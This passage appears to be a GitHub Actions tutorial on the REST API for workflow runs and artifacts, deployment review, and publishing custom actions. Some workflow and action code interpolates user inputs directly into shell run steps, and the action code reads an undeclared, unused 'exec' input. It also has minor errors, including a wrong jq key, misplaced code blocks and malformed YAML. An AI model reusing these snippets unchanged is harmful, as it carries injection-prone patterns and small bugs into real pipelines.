```bash
curl -H "Authorization: token YOUR_TOKEN" \
  https://api.github.com/repos/octocat/Hello-World/actions/workflows/123456
```

**Response**:

```json
{
  "id": 123456,
  "name": "CI Pipeline",
  "path": ".github/workflows/ci.yml",
  "state": "active",
  "created_at": "2024-01-15T10:30:00Z",
  "updated_at": "2024-03-09T14:20:00Z"
}
```

### 3. **List Workflow Runs**

**Endpoint**: `GET /repos/{owner}/{repo}/actions/runs`

**What it does**: List all workflow runs (executions) in a repository

#### Example: Get Recent Failed Runs

```bash
curl -H "Authorization: token YOUR_TOKEN" \
  "https://api.github.com/repos/octocat/Hello-World/actions/runs?status=failure&per_page=10"
```

**Response**:

```json
{
  "total_count": 5,
  "workflow_runs": [
    {
      "id": 987654,
      "name": "CI",
      "node_id": "WFR123456",
      "head_branch": "main",
      "head_sha": "abc123def456",
      "status": "failure",
      "conclusion": "failure",
      "workflow_id": 123456,
      "check_suite_id": 555555,
      "check_suite_node_id": "CS555555",
      "url": "https://api.github.com/repos/octocat/Hello-World/actions/runs/987654",
      "html_url": "https://github.com/octocat/Hello-World/actions/runs/987654",
      "created_at": "2024-03-09T10:15:00Z",
      "updated_at": "2024-03-09T10:20:00Z",
      "run_number": 42,
      "event": "push",
      "display_title": "Deployment workflow",
      "actor": {
        "login": "octocat",
        "id": 1
      }
    }
  ]
}
```

#### Query Parameters

| Parameter    | Values                                                   | Description                  |
| ------------ | -------------------------------------------------------- | ---------------------------- |
| `status`     | queued, in_progress, completed                           | Filter by workflow status    |
| `conclusion` | success, failure, neutral, cancelled, skipped, timed_out | Filter by result             |
| `per_page`   | 1-100                                                    | Items per page (default: 30) |
| `page`       | Integer                                                  | Page number (default: 1)     |
| `branch`     | Branch name                                              | Filter by branch             |
| `actor`      | Username                                                 | Filter by user who triggered |
| `event`      | Event name                                               | Filter by trigger event      |
| `created`    | Date range                                               | Filter by creation date      |

### 4. **Get Workflow Run Details**

**Endpoint**: `GET /repos/{owner}/{repo}/actions/runs/{run_id}`

**What it does**: Get detailed information about a specific workflow run

```bash
curl -H "Authorization: token YOUR_TOKEN" \
  https://api.github.com/repos/octocat/Hello-World/actions/runs/987654
```

#### Complete Python Example

```python
import requests
import json
from datetime import datetime, timedelta

class GitHubWorkflowAPI:
    def __init__(self, owner, repo, token):
        self.owner = owner
        self.repo = repo
        self.token = token
        self.base_url = "https://api.github.com"
        self.headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json"
        }

    def get_workflow_runs(self, status=None, conclusion=None, limit=10):
        """Get workflow runs with optional filtering"""
        url = f"{self.base_url}/repos/{self.owner}/{self.repo}/actions/runs"

        params = {"per_page": limit}
        if status:
            params["status"] = status
        if conclusion:
            params["conclusion"] = conclusion

        response = requests.get(url, headers=self.headers, params=params)
        response.raise_for_status()
        return response.json()["workflow_runs"]

    def get_run_details(self, run_id):
        """Get detailed information about a specific workflow run"""
        url = f"{self.base_url}/repos/{self.owner}/{self.repo}/actions/runs/{run_id}"
        response = requests.get(url, headers=self.headers)
        response.raise_for_status()
        return response.json()

    def cancel_workflow_run(self, run_id):
        """Cancel a running workflow"""
        url = f"{self.base_url}/repos/{self.owner}/{self.repo}/actions/runs/{run_id}/cancel"
        response = requests.post(url, headers=self.headers)
        return response.status_code == 202

    def get_failed_runs_in_last_day(self):
        """Find all failed runs from the last 24 hours"""
        failed_runs = self.get_workflow_runs(status="completed", conclusion="failure", limit=50)
        yesterday = datetime.utcnow() - timedelta(days=1)

        return [
            run for run in failed_runs
            if datetime.fromisoformat(run["updated_at"].replace("Z", "+00:00")) > yesterday
        ]

# Usage
api = GitHubWorkflowAPI("octocat", "Hello-World", "YOUR_TOKEN")

# Get failed runs from last day
failed = api.get_failed_runs_in_last_day()
for run in failed:
    print(f"Run #{run['run_number']}: {run['name']} - {run['conclusion']}")
    print(f"  Started: {run['created_at']}")
    print(f"  URL: {run['html_url']}")
```

### 5. **Trigger Workflow (workflow_dispatch)**

**Endpoint**: `POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches`

**What it does**: Manually trigger a workflow run with optional inputs

**Requirements**: Workflow must have `workflow_dispatch` trigger event

```bash
curl -X POST \
  -H "Authorization: token YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "ref": "main",
    "inputs": {
      "environment": "production",
      "version": "1.0.0"
    }
  }' \
  https://api.github.com/repos/octocat/Hello-World/actions/workflows/123456/dispatches
```

#### Workflow with Inputs

```yaml
name: Deployment

on:
  workflow_dispatch:
    inputs:
      environment:
        description: "Environment to deploy to"
        required: true
        type: choice
        options:
          - development
          - staging
          - production
      version:
        description: "Version tag"
        required: true
        type: string

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ inputs.version }} to ${{ inputs.environment }}"
```

#### Python Example: Trigger Deployment

```python
import requests

def trigger_deployment(owner, repo, workflow_id, environment, version, token):
    url = f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches"

    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }

    payload = {
        "ref": "main",
        "inputs": {
            "environment": environment,
            "version": version
        }
    }

    response = requests.post(url, headers=headers, json=payload)

    if response.status_code == 204:
        print(f"✓ Workflow triggered successfully")
        return True
    else:
        print(f"✗ Error: {response.status_code} - {response.text}")
        return False

# Usage
trigger_deployment(
    "octocat",
    "Hello-World",
    "123456",
    "production",
    "v2.0.0",
    "YOUR_TOKEN"
)
```

### 6. **Re-run Workflow**

**Endpoint**: `POST /repos/{owner}/{repo}/actions/runs/{run_id}/rerun`

**What it does**: Re-run a completed workflow

```bash
curl -X POST \
  -H "Authorization: token YOUR_TOKEN" \
  https://api.github.com/repos/octocat/Hello-World/actions/runs/987654/rerun
```

**Response**: `HTTP 201` (Created)

#### Script: Re-run Failed Workflows

```bash
#!/bin/bash

REPO_OWNER="octocat"
REPO_NAME="Hello-World"
GITHUB_TOKEN="YOUR_TOKEN"

# Get failed runs
FAILED_RUNS=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/$REPO_OWNER/$REPO_NAME/actions/runs?status=completed&conclusion=failure&per_page=5" | jq '.workflow_runs[].id')

echo "Re-running failed workflows..."
for RUN_ID in $FAILED_RUNS; do
  curl -X POST \
    -H "Authorization: token $GITHUB_TOKEN" \
    https://api.github.com/repos/$REPO_OWNER/$REPO_NAME/actions/runs/$RUN_ID/rerun
  echo "✓ Re-ran run #$RUN_ID"
done
```

### 7. **Cancel Workflow Run**

**Endpoint**: `POST /repos/{owner}/{repo}/actions/runs/{run_id}/cancel`

**What it does**: Cancel a running workflow

```bash
curl -X POST \
  -H "Authorization: token YOUR_TOKEN" \
  https://api.github.com/repos/octocat/Hello-World/actions/runs/987654/cancel
```

### 8. **Delete Workflow Run**

**Endpoint**: `DELETE /repos/{owner}/{repo}/actions/runs/{run_id}`

**What it does**: Delete a workflow run and associated artifacts

```bash
curl -X DELETE \
  -H "Authorization: token YOUR_TOKEN" \
  https://api.github.com/repos/octocat/Hello-World/actions/runs/987654
```

### 9. **List Jobs in a Workflow Run**

**Endpoint**: `GET /repos/{owner}/{repo}/actions/runs/{run_id}/jobs`

**What it does**: Get all jobs within a workflow run

```bash
curl -H "Authorization: token YOUR_TOKEN" \
  https://api.github.com/repos/octocat/Hello-World/actions/runs/987654/jobs
```

**Response**:

```json
{
  "total_count": 2,
  "jobs": [
    {
      "id": 555555,
      "run_id": 987654,
      "workflow_name": "CI",
      "status": "completed",
      "conclusion": "success",
      "name": "build",
      "steps": [
        {
          "name": "Checkout code",
          "status": "completed",
          "conclusion": "success"
        }
      ]
    }
  ]
}
```

### 10. **Get Job Logs**

**Endpoint**: `GET /repos/{owner}/{repo}/actions/jobs/{job_id}/logs`

**What it does**: Download complete job logs

```bash
curl -H "Authorization: token YOUR_TOKEN" \
  https://api.github.com/repos/octocat/Hello-World/actions/jobs/555555/logs \
  > job-logs.txt
```

### 11. **List Artifacts**

**Endpoint**: `GET /repos/{owner}/{repo}/actions/artifacts`

**What it does**: Get all artifacts in a repository

```bash
curl -H "Authorization: token YOUR_TOKEN" \
  "https://api.github.com/repos/octocat/Hello-World/actions/artifacts?per_page=10"
```

**Response**:

```json
{
  "total_count": 5,
  "artifacts": [
    {
      "id": 111111,
      "name": "build-output",
      "size_in_bytes": 2048576,
      "url": "https://api.github.com/repos/octocat/Hello-World/actions/artifacts/111111",
      "archive_download_url": "https://api.github.com/repos/octocat/Hello-World/actions/artifacts/111111/zip",
      "expired": false,
      "created_at": "2024-03-09T10:15:00Z",
      "expires_at": "2024-03-16T10:15:00Z",
      "updated_at": "2024-03-09T10:20:00Z"
    }
  ]
}
```

#### Clean Up Old Artifacts

```bash
#!/bin/bash

REPO="octocat/Hello-World"
TOKEN="YOUR_TOKEN"
THRESHOLD_DAYS=7

# Get all artifacts
ARTIFACTS=$(curl -s -H "Authorization: token $TOKEN" \
  "https://api.github.com/repos/$REPO/actions/artifacts?per_page=100" | jq '.artifacts[]')

echo "$ARTIFACTS" | jq -r '.expires_at' | while read EXPIRY_DATE; do
  ARTIFACT_ID=$(echo "$ARTIFACTS" | jq -r 'select(.expires_at == "'"$EXPIRY_DATE"'") | .id')

  DAYS_UNTIL_EXPIRY=$(( ($(date -d "$EXPIRY_DATE" +%s) - $(date +%s)) / 86400 ))

  if [ $DAYS_UNTIL_EXPIRY -lt $THRESHOLD_DAYS ]; then
    echo "Deleting artifact $ARTIFACT_ID (expires in $DAYS_UNTIL_EXPIRY days)"
    curl -X DELETE -H "Authorization: token $TOKEN" \
      "https://api.github.com/repos/$REPO/actions/artifacts/$ARTIFACT_ID"
  fi
done
```

### 12. **Best Practices for REST API Usage**

#### ✓ Recommended Practices — REST API Usage

```bash
# ✓ Always use authentication
curl -H "Authorization: token YOUR_TOKEN" ...

# ✓ Use pagination for large result sets
"per_page=100&page=1"

# ✓ Use descriptive error handling
if [ $? -ne 0 ]; then
  echo "::error::API call failed"
  exit 1
fi

# ✓ Rate limit headers
curl -i -H "Authorization: token YOUR_TOKEN" ... | grep X-RateLimit
# X-RateLimit-Limit: 5000
# X-RateLimit-Remaining: 4999
# X-RateLimit-Reset: 1372700873

# ✓ Store token securely (use environment variables or GitHub Secrets)
export GITHUB_TOKEN=$(cat ~/.github/token)

# ✓ Check API response status codes
if response.status_code == 201:
    print("Created successfully")
elif response.status_code == 204:
    print("Action completed successfully")
elif response.status_code == 404:
    print("Resource not found")
```

#### ✗ Anti-Patterns to Avoid — REST API Usage

```bash
# ✗ Never hardcode tokens
curl -H "Authorization: token ghp_1234567890abcdefg" ...  # BAD!

# ✗ Don't ignore rate limits
# API: 5000 requests/hour for authenticated users
# 60 requests/hour for unauthenticated users

# ✗ Don't make duplicate API calls
# Bad: Query same endpoint multiple times
# Good: Cache results or batch requests

# ✗ Don't expose response data with secrets
echo "API Response: $RESPONSE"  # If contains sensitive data!
```

### 13. **API Rate Limits and Quotas**

| Category                 | Limit | Resets     |
| ------------------------ | ----- | ---------- |
| Authenticated Requests   | 5,000 | Per hour   |
| Unauthenticated Requests | 60    | Per hour   |
| Search Queries           | 30    | Per minute |
| Concurrent Requests      | 10    | Per second |

#### Check Rate Limit Status

```bash
curl -H "Authorization: token YOUR_TOKEN" \
  https://api.github.com/rate_limit | jq '.rate_limit'

# Output:
# {
#   "limit": 5000,
#   "remaining": 4999,
#   "reset": 1372700873
# }
```

#### Handle Rate Limit Errors

```python
import time
import requests
from datetime import datetime

def safe_api_call(url, headers, max_retries=3):
    for attempt in range(max_retries):
        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            return response.json()

        elif response.status_code == 403:
            # Rate limited
            reset_time = int(response.headers.get('X-RateLimit-Reset', 0))
            wait_seconds = reset_time - int(time.time())

            if wait_seconds > 0:
                print(f"Rate limited. Waiting {wait_seconds} seconds...")
                time.sleep(wait_seconds + 1)
                continue

        elif response.status_code == 404:
            raise Exception(f"Resource not found: {url}")

        elif response.status_code >= 500:
            # Server error, retry
            if attempt < max_retries - 1:
                wait = 2 ** attempt
                print(f"Server error. Retrying in {wait} seconds...")
                time.sleep(wait)
                continue

        raise Exception(f"API error: {response.status_code} - {response.text}")
```

---

## Reviewing Deployments

### What is Deployment Review

Deployment review is a process where designated team members must approve deployment actions before they proceed to production or other protected environments. GitHub requires explicit approval from reviewers before a workflow can access a protected environment, enabling governance, compliance, and quality assurance.

### Why Review Deployments

**Key Benefits:**

1. **Compliance**: Enforce organizational policies and regulatory requirements
2. **Quality Assurance**: Catch issues before they reach production
3. **Risk Mitigation**: Reduce blast radius of failed deployments
4. **Accountability**: Create audit trail of deployment decisions
5. **Knowledge Sharing**: Team members stay informed about changes
6. **Context Review**: Reviewers can check related code changes, test results
7. **Scheduled Deployment**: Deployments can be held until convenient time

### How Deployment Review Works

**Workflow:**

1. Workflow reaches deployment step with protected environment
2. Execution pauses and requests approval from designated reviewers
3. Reviewers can examine job execution logs, code changes, and context
4. Reviewer approves or rejects deployment
5. If approved, deployment proceeds; if rejected, workflow stops

### 1. **Configuring Environment for Review**

**Repository Settings:**

Navigate to: `Settings > Environments > Create environment or select protection rules`

```yaml
# Enable Required Reviewers in GitHub UI:
# 1. Go to Settings > Environments
# 2. Select or create environment (e.g., production)
# 3. Check "Required reviewers"
# 4. Select users/teams who must review deployments
# 5. Optionally set wait timer before deployment
```

**Workflow Configuration:**

```yaml
name: Deploy with Review

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - uses: actions/checkout@v3

      - name: Pre-deployment checks
        run: |
          echo "Running pre-deployment checks..."
          npm run test
          npm run lint

      - name: Deploy
        run: npm run deploy
```

### 2. **Review Process**

#### Step 1: Workflow Pauses for Review

When workflow reaches a protected environment step:

```text
✓ Checkout
✓ Tests passed
✓ Build successful
⏸ WAITING FOR REVIEW
  Environment: production
  Reviewers needed: 2 from [eng-leads]
```

#### Step 2: Reviewer Examines Deployment

**Reviewer's Perspective:**

```text
GitHub Actions > Your Workflow > Review Deployment

Deployment Details:
- Environment: production
- Triggered by: john-dev
- Branch: main
- Commit: abc123def456
- Tests: PASSED
- Build: PASSED

Linked Changes:
- 5 files changed
- 150 additions
- 20 deletions

Review Options:
[✓ Approve]  [✗ Reject]
```

#### Step 3: Reviewer Action

**Approve Deployment:**

```yaml
# Reviewer clicks "Approve"
# Workflow continues immediately

- name: Deploy to Production
  run: |
    npm run deploy:prod
    echo "Deployment successful"
```

**Reject Deployment:**

```yaml
# Reviewer clicks "Reject" with comment: "Test coverage insufficient"
# Workflow stops, deployment does not proceed
# Notification sent to original trigger user
```

### 3. **Complete Deployment Review Workflow**

```yaml
name: Production Deployment with Multi-Stage Review

on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      environment:
        description: "Target environment"
        required: true
        type: choice
        options:
          - staging
          - production

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: "18"
          cache: npm

      - name: Install Dependencies
        run: npm ci

      - name: Run Tests
        run: npm test -- --coverage

      - name: Run Lint
        run: npm run lint

      - name: Build Application
        run: npm run build

      - name: Upload Build Artifacts
        uses: actions/upload-artifact@v3
        with:
          name: build-artifacts
          path: dist/
          retention-days: 1

      - name: Create Deployment Summary
        run: |
          cat > deployment-summary.md <<EOF
          # Deployment Summary
          - **Branch**: ${{ github.ref_name }}
          - **Commit**: ${{ github.sha }}
          - **Author**: ${{ github.actor }}
          - **Triggered at**: $(date)
          - **Test Status**: ✅ PASSED
          - **Build Status**: ✅ SUCCESS
          EOF

      - name: Upload Summary
        uses: actions/upload-artifact@v3
        with:
          name: deployment-summary
          path: deployment-summary.md

  deploy-staging:
    needs: build-and-test
    runs-on: ubuntu-latest
    # Staging doesn't require review
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - uses: actions/checkout@v3

      - name: Download Build Artifacts
        uses: actions/download-artifact@v3
        with:
          name: build-artifacts
          path: ./dist/

      - name: Deploy to Staging
        run: |
          echo "=== Deploying to Staging ==="
          echo "Build artifacts size: $(du -sh dist/)"
          # Deploy script here
          # ./scripts/deploy-staging.sh

      - name: Run Staging Tests
        run: |
          echo "Running integration tests against staging..."
          # npm run test:integration -- --env=staging

      - name: Notify Deployment
        run: |
          echo "✓ Staging deployment successful"
          echo "URL: https://staging.example.com"

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    # Production requires review from DevOps team
    environment:
      name: production
      url: https://example.com
    steps:
      - uses: actions/checkout@v3

      - name: Download Build Artifacts
        uses: actions/download-artifact@v3
        with:
          name: build-artifacts
          path: ./dist/

      - name: Pre-production Checklist
        run: |
          echo "=== Pre-production Checks ==="
          echo "✓ Build artifacts verified"
          echo "✓ Staging tests passed"
          echo "✓ Awaiting production reviewer approval"
          echo "Review environment is set up"

      - name: Deploy to Production
        run: |
          echo "=== DEPLOYING TO PRODUCTION ==="
          echo "Timestamp: $(date)"
          echo "Version: ${{ github.ref_name }}-${{ github.run_number }}"
          # ./scripts/deploy-prod.sh

      - name: Verify Deployment
        run: |
          # Health checks
          echo "Running post-deployment health checks..."
          sleep 5
          echo "✓ Application health: OK"
          echo "✓ API responding: OK"
          echo "✓ Database connected: OK"

      - name: Create Release Annotation
        run: |
          echo "Release deployed to production"
          echo "Commit: ${{ github.sha }}"
          echo "Deployed by: ${{ github.actor }} (with approval)"

      - name: Notify Team
        if: success()
        run: echo "🚀 Production deployment successful!"
```

### 4. **Reviewing Deployment Best Practices**

#### ✓ Recommended Practices — Deployment Review

```yaml
# ✓ Require reviewers for production
environment:
  name: production
  url: https://example.com
  # Configured in settings with Required Reviewers

# ✓ Include wait timer for safety
# Settings > Environments > 30-minute wait timer

# ✓ Add clear pre-deployment information
- name: Deployment Information
  run: |
    echo "=== Deployment Details ==="
    echo "Environment: ${{ github.environment }}"
    echo "Triggered by: ${{ github.actor }}"
    echo "Branch: ${{ github.ref_name }}"
    echo "Commit: ${{ github.sha }}"

# ✓ Document purpose of each deployment
- name: Deployment Purpose
  run: |
    cat > DEPLOYMENT_NOTES.md <<EOF
    ## Changes in This Deployment
    - Feature: New user authentication system
    - Breaking changes: API v1 deprecated
    - Rollback plan: Use v2.0.0 tag
    EOF

# ✓ Implement gradual deployments
- name: Canary Deployment
  run: |
    ./deploy.sh --canary --percentage=10
    sleep 300  # Monitor for 5 minutes
    ./deploy.sh --full
```

#### ✗ Anti-Patterns to Avoid — Deployment Review

```yaml
# ✗ Don't bypass reviews even in emergency
if: github.actor == 'admin'
  environment: production  # Bad - circumvents review

# ✗ Don't auto-approve without manual check
# Reviews MUST be manual human decisions

# ✗ Don't deploy without collecting metrics
- name: Deploy
  run: ./deploy.sh  # No health checks!

# ✗ Don't ignore wait timers
# Setting 0 wait timer for production is risky
```

### 5. **Monitoring Reviewed Deployments**

```bash
#!/bin/bash

# Get all deployments with review status
curl -H "Authorization: token YOUR_TOKEN" \
  "https://api.github.com/repos/owner/repo/deployments?environment=production" | \
  jq '.[] | {id, status, created_at, creator, environment}'

# Output:
# {
#   "id": 123456,
#   "status": "success",
#   "created_at": "2024-03-09T14:30:00Z",
#   "creator": {"login": "reviewer-name"},
#   "environment": "production"
# }
```

---

## Creating and Publishing Actions

### What are GitHub Actions

GitHub Actions are reusable units of code that perform specific tasks. You can create custom actions from Docker containers, JavaScript, or composite scripts, then publish them to the GitHub Marketplace or use them privately across repositories.

### Why Create Custom Actions

**Key Benefits:**

1. **Code Reuse**: Share functionality across multiple workflows
2. **Abstraction**: Hide complexity behind simple interface
3. **Maintainability**: Update logic in one place
4. **Standardization**: Enforce consistent practices
5. **Community**: Share utilities with broader developer ecosystem
6. **Discoverability**: Marketplace makes finding actions easy
7. **Versioning**: Release versions independently from workflows

### How Actions Work

**Action Types:**

1. **JavaScript Actions**: Node.js-based, fast execution
2. **Docker Container Actions**: Any language, larger file size
3. **Composite Actions**: Combine multiple steps using workflow syntax

### 1. **Creating a JavaScript Action**

**Project Structure:**

```text
my-action/
├── action.yml           # Action metadata
├── package.json         # Node.js dependencies
├── index.js            # Main action code
├── lib/
│   └── utils.js        # Helper functions
└── README.md           # Documentation
```

**action.yml** - Action Definition

```yaml
name: "Deploy App"
description: "Deploy application to server"

inputs:
  environment:
    description: "Target environment"
    required: true
    default: "staging"

  version:
    description: "Version to deploy"
    required: true

  debug:
    description: "Enable debug mode"
    required: false
    default: "false"

outputs:
  deployment-url:
    description: "URL of deployed application"
    value: ${{ steps.deploy.outputs.url }}

  deployment-id:
    description: "Deployment identifier"
    value: ${{ steps.deploy.outputs.id }}

runs:
  using: "node20"
  main: "index.js"

branding:
  icon: "send"
  color: "blue"
```

**index.js** - Action Implementation

```javascript
const core = require("@actions/core");
const exec = require("@actions/exec");
const github = require("@actions/github");
const fs = require("fs");
const path = require("path");

async function run() {
  try {
    // Get inputs
    const environment = core.getInput("environment");
    const version = core.getInput("version");
    const debug = core.getInput("debug") === "true";

    // Set debug mode
    if (debug) {
      core.debug("Debug mode enabled");
    }

    core.info(`Deploying version ${version} to ${environment}`);

    // Validate inputs
    if (!["staging", "production"].includes(environment)) {
      throw new Error(`Invalid environment: ${environment}`);
    }

    // Get context information
    const context = github.context;
    core.info(`Triggered by: ${context.actor}`);
    core.info(`Repository: ${context.repo.owner}/${context.repo.repo}`);
    core.info(`Branch: ${context.ref}`);

    // Perform deployment
    core.startGroup("Starting deployment");

    // Run deployment command
    let deployUrl = "";
    let deployId = "";

    let output = "";
    const myExec = core.getInput("exec") || "sh";

    await exec.exec("bash", ["./deploy.sh", environment, version], {
      listeners: {
        stdout: (data) => {
          output += data.toString();
        },
        stderr: (data) => {
          core.warning(data.toString());
        },
      },
    });

    // Parse output
    const lines = output.split("\n");
    const urlLine = lines.find((l) => l.includes("DEPLOYMENT_URL="));
    const idLine = lines.find((l) => l.includes("DEPLOYMENT_ID="));

    if (urlLine) {
      deployUrl = urlLine.split("=")[1];
    }
    if (idLine) {
      deployId = idLine.split("=")[1];
    }

    core.endGroup();

    // Set outputs
    core.setOutput("deployment-url", deployUrl);
    core.setOutput("deployment-id", deployId);

    // Create asset
    core.notice(`✓ Deployment successful!\nURL: ${deployUrl}\nID: ${deployId}`);
  } catch (error) {
    core.setFailed(`Action failed: ${error.message}`);
    process.exit(1);
  }
}

run();
```

#### package.json

```json
{
  "name": "deploy-app",
  "version": "1.0.0",
  "main": "index.js",
  "description": "Deploy application to server",
  "dependencies": {
    "@actions/core": "^1.10.0",
    "@actions/exec": "^1.1.1",
    "@actions/github": "^6.0.0"
  },
  "scripts": {
    "build": "npm install",
    "test": "jest"
  }
}
```

### 2. **Using Your JavaScript Action**

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Deploy with Custom Action
        id: deploy
        uses: ./ # Local action in same repo
        with:
          environment: production
          version: 1.2.3
          debug: true

      - name: Use Deployment Output
        run: |
          echo "Deployed URL: ${{ steps.deploy.outputs.deployment-url }}"
          echo "Deployment ID: ${{ steps.deploy.outputs.deployment-id }}"
```

### 3. **Creating a Composite Action**

**action.yml** - Composite Action

```yaml
name: "Build and Test"
description: "Build application and run tests"

inputs:
  node-version:
    description: "Node.js version"
    required: false
    default: "18"

  test-command:
    description: "Command to run tests"
    required: false
    default: "npm test"

outputs:
  build-time:
    description: "Time taken for build"
    value: ${{ steps.build.outputs.time }}

  test-results:
    description: "Test results summary"
    value: ${{ steps.test.outputs.summary }}

runs:
  using: "composite"
  steps:
    - name: Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: ${{ inputs.node-version }}
        cache: npm

    - name: Install Dependencies
      run: npm ci
      shell: bash

    - name: Build
      id: build
      run: |
        START=$(date +%s%N)
        npm run build
        END=$(date +%s%N)
        TIME=$(( ($END - $START) / 1000000 ))
        echo "time=${TIME}ms" >> $GITHUB_OUTPUT
      shell: bash

    - name: Run Tests
      id: test
      run: |
        ${{ inputs.test-command }} 2>&1 | tee test-output.log
        PASSED=$(grep -c "passed" test-output.log || echo 0)
        echo "summary=${PASSED} tests passed" >> $GITHUB_OUTPUT
      shell: bash

    - name: Upload Coverage
      if: always()
      uses: codecov/codecov-action@v3
      with:
        files: ./coverage/coverage-final.json
```

### 4. **Publishing Action to Marketplace**

**Create Release Management Action - Marketplace Requirements:**

```markdown
# Checklist for Publishing to Marketplace

✓ Create public repository named [owner]/[action-name]
✓ Add `action.yml` with proper metadata
✓ Add `README.md` with:

- Description of what action does
- Screenshots (if applicable)
- Prequisites
- Usage examples
- Inputs and outputs
- Contributing guidelines
  ✓ Create release with semantic versioning (v1.0.0)
  ✓ Create major version tag (v1)
  ✓ Add LICENSE file (MIT recommended)
  ✓ Add action.yml to repository root
```

#### README.md Template

```markdown
# Deploy App Action

[![GitHub Actions](https://img.shields.io/badge/GitHub-Actions-blue)](https://github.com/features/actions)
[![Marketplace](https://img.shields.io/badge/Marketplace-Available-green)](https://github.com/marketplace/actions/deploy-app)

`Deploy App` is a GitHub Action that deploys your application to a server with automatic health checks and rollback capabilities.

## Features

- ✅ Deploy to staging and production
- ✅ Automatic health checks
- ✅ Rollback on failure
- ✅ Deployment notifications
- ✅ Debug mode support

## Usage

```yaml
- name: Deploy App
  uses: owner/deploy-app-action@v1
  with:
    environment: production
    version: 1.0.0
```
```

```

```

## Inputs

| Input         | Required | Default | Description                              |
| ------------- | -------- | ------- | ---------------------------------------- |
| `environment` | Yes      | -       | Target environment (staging, production) |
| `version`     | Yes      | -       | Version to deploy                        |
| `debug`       | No       | false   | Enable debug logging                     |

## Outputs

| Output           | Description                 |
| ---------------- | --------------------------- |
| `deployment-url` | URL of deployed application |
| `deployment-id`  | Deployment identifier       |

## Example

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: owner/deploy-app-action@v1
        id: deploy
        with:
          environment: production
          version: ${{ github.ref_name }}
      - run: echo "Deployed to ${{ steps.deploy.outputs.deployment-url }}"
```

## License

MIT

```text

```

**Release and Version Management**

```bash
# Create major version tag
git tag -a v1 -m "Release v1"
git push origin v1

# Create specific version tag
git tag -a v1.0.0 -m "Release v1.0.0"
git push origin v1.0.0

# Update major version tag to point to latest minor/patch
git tag -fa v1 -m "Update v1 to latest"
git push origin v1 --force
```

### 4. **Action Versioning & Release Strategies**

#### Semantic Versioning for Actions

GitHub Actions uses **semantic versioning** (MAJOR.MINOR.PATCH):

```text
v1.0.0 → v1.1.0 → v1.2.0 (patch/minor bumps)
v1.x.x → v2.0.0 (major version bump)
```

**Release Guidelines:**

| Version           | When to Release        | Example Change                            | Backward Compatible |
| ----------------- | ---------------------- | ----------------------------------------- | ------------------- |
| **v1.0.0→v1.0.1** | Bug fixes              | Fix typo in logging                       | ✅ Yes              |
| **v1.0.0→v1.1.0** | New features           | Add optional input parameter              | ✅ Yes              |
| **v1.x.x→v2.0.0** | Breaking changes       | Rename required input, remove old feature | ❌ No               |
| **v1→latest**     | Major version tracking | Keep v1 tag pointing to latest v1.x.x     | ✅ Yes              |

#### Major Version Tag Strategy

For optimal user experience, maintain a **major version tag** (e.g., `v1`, `v2`) that points to the latest stable minor/patch version:

```bash
# Release v1.1.0 (new feature)
git tag -a v1.1.0 -m "Add new parameter for cleanup"
git push origin v1.1.0

# Update v1 tag to point to v1.1.0
git tag -fa v1 -m "Latest v1.x release"
git push origin v1 --force-with-lease

# Users with v1 tag automatically get the improvement
# - GitHub Actions caches v1.0.0
# - New workflows using v1 get v1.1.0
# - Old references to v1 won't break
```

**Action Consumer Benefits:**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Gets latest v1.x.x (currently v1.2.5)
      - uses: org/action@v1

      # Gets specific version (never changes)
      - uses: org/action@v1.2.0

      # Gets development version (for testing)
      - uses: org/action@main
```

#### Release Checklist

Before publishing a new version:

- [ ] **Test thoroughly** on target platforms (Linux, Windows, macOS if applicable)
- [ ] **Update action.yml**: Bump version in description/comments
- [ ] **Update README.md**: Document new features or breaking changes
- [ ] **Create CHANGELOG.md entry**: List breaking changes, new features, bug fixes
- [ ] **Merge to main**: All changes should be in main branch before tagging
- [ ] **Create git tag**: `git tag -a vX.Y.Z -m "Release message"`
- [ ] **Push tag**: `git push origin vX.Y.Z`
- [ ] **Update major version tag** (if stable): `git tag -fa vX -m "Latest"` and `git push origin vX --force-with-lease`
- [ ] **Create GitHub Release**: Link to CHANGELOG, include migration notes for major versions
- [ ] **Verify on Marketplace**: Check action display and documentation render correctly

#### Deprecation and Migration Guide

When deprecating or making breaking changes:

```yaml
action.yml:
  description: |
    ↓↓↓ BREAKING CHANGE in v2.0.0 ↓↓↓
    - Input 'docker-user' renamed to 'registry-user'
    - Input 'docker-tag' renamed to 'image-tag'
    See migration guide: github.com/org/action/wiki/v1-to-v2-migration
    ↑↑↑ Use action@v1 for old behavior ↑↑↑

inputs:
  registry-user: # New name
    description: "Docker registry username"
    required: true
  image-tag: # New name
    description: "Image tag (was docker-tag)"
    required: false
    default: "latest"
```

**Migration Guide Template (v1 → v2):**

```markdown
# Migration Guide: v1 → v2

## Breaking Changes

### 1. Input Renaming

- `docker-user` → `registry-user`
- `docker-tag` → `image-tag`

### 2. Output Format Change

- `image-uri` now includes registry
  - v1: `myimage:latest`
  - v2: `ghcr.io/org/myimage:latest`

### 3. GitHub Token Permissions

- Now requires `packages: write` (was `contents: write`)

## Migration Steps

### Before (v1)

```yaml
- uses: org/action@v1
  with:
    docker-user: myuser
    docker-tag: v1.0
```
```

```

### After (v2)

```yaml
- uses: org/action@v2
  permissions:
    packages: write
  with:
